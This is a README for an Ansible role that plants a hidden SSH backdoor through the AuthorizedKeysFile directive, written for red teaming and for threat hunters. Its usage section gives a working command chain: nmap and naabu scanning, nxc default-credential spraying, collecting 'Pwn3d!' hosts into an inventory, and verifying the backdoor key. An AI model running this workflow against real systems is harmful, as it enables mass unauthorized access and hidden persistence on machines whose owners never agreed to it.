unauthorized_keys
=========

This role is designed to drop tasks into for unauthorized administration (red teaming) at scale. It was created partially as a reference for practical ways in which remote administration mechanisms can be configured to function in unexpected ways, and partially as a way to document what to look for and how it works, when threat hunting. The name is based on the AuthorizedKeysFile SSH directive.

This is most effective in environments where Ansible is seen as "normal". Leveraging the inventory and SSH arguments in Ansible can make this role effective. Check the following references as well as the inventory example, below the playbook example.

- https://stackoverflow.com/questions/23074412/how-to-set-host-key-checking-false-in-ansible-inventory-file
- https://docs.ansible.com/ansible/latest/collections/ansible/builtin/ssh_connection.html

Tasks currently include:

- `unauthorized-keys.yml`: Create a backdoor by hiding via the `AuthorizedKeysFile` directive

Typical usage, if you already have a `scope.txt`:

```bash
# nmap ping sweep
sudo nmap -n -sn -PE -e tun0 -oA nmap-ping-sweep-"$(date +%F_%T)" -iL scope.txt --disable-arp-ping

# naabu scoped ports
naabu -list scope.txt -port 21,22,53,80,443,445,3389,8080 -i tun0 -o naabu-scoped-ports-"$(date +%F_%T)".log
grep ':22' naabu-scoped-ports-2024-01-02_03:04:05.log | cut -d ':' -f 1 > targets-ssh.txt

# nxc ssh default creds audit
nxc ssh -u '<username>' -p '<password>' --log nxc-ssh-audit-$(date +%F_%T).log ./targets-ssh.txt
cat nxc-ssh-audit-2024-01-02_03:04:05.log | grep 'Pwn3d!' | awk '{print $9}' | tee targets-ssh-inventory-"$(date +%F_%T)".txt

# targets-ssh-inventory-"$(date +%F_%T)".txt becomes your ansible inventory
cat targets-ssh-inventory-"$(date +%F_%T)".txt | sed -E 's/$/:/g'
# paste the results into the inventory.yml file

# nxc backdoor audit, for example if you installed a backdoor key with the unauthorized-keys task
nxc ssh -u '<username>' -p '<ssh-key-password>' --key-file ./id_rsa --log nxc-ssh-audit-$(date +%F_%T).log ./targets-ssh.txt
```

An error you may run into with older systems (this still needs diagnosed):

```txt
\r\nSyntaxError: invalid syntax\r\n", "msg": "MODULE FAILURE\nSee stdout/stderr for the exact error", "rc": 1, "warnings": ["Platform linux
on host 10.1.1.18 is using the discovered Python interpreter at /usr/bin/python3, but future installation of another Python interpreter could change the meaning of that path. See https://docs.ansible
.com/ansible-core/2.17/reference_appendices/interpreter_discovery.html for more information."]}}, "msg": "The following modules failed to execute: ansible.legacy.setup\n"}
```

Requirements
------------

You need `sshpass` installed if the targets use password auth.

```bash
sudo apt update; sudo apt install -yq sshpass
```

Role Variables
--------------

In `defaults/main.yml`:

- `public_key`: SSH public keys to use.


Dependencies
------------

None.

Example Playbook
----------------

Playbook example:

```yml
- name: "Default Playbook"
  hosts:
    all
  roles:
    - role: "unauthorized_keys"
```

Inventory example:

```yml
ssh_group:
  hosts:
    10.10.0.15:
    10.10.0.16:
    10.10.0.20:
    10.10.0.28:
    10.10.0.29:
  vars:
    ansible_port: 22
    ansible_user: "username"
    # Optional, use this if passwords are in use
    # You can also put these into a vault and call them here as variables
    ansible_ssh_password: "password"
    ansible_become_password: "password"
    ansible_become_method: sudo
    # Customize SSH Arguments using ansible_ssh_common_args
    ansible_ssh_common_args: '-o IdentitiesOnly=yes -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null'

rdp_group:
  # Do the same here for rdp
  <SNIP>

mysql_group:
  # Do the same here for mysql
  <SNIP>
```

License
-------

MIT

Author Information
------------------

[straysheep-dev/ansible-configs](https://github.com/straysheep-dev/ansible-configs/)
